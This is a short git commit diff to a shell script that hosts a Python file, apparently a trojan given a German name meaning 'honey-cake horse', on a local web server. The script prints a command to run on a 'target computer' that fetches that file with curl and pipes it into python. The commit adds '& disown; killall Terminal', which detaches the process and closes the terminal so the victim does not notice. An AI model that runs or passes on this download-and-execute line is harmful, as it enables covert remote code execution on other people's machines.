cc2daf09a9dc339827596eefd03b8ff037e1e8d8
leftside97 <chrswr97@gmail.com>
2022-05-25 22:02:27 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,6 +3,6 @@
 IP="192.168.1.x"
 PORT="8080"
 echo "run on target computer:"
-echo "curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python"
+echo "curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal"
 echo ""
 /bin/python3 -m http.server $PORT
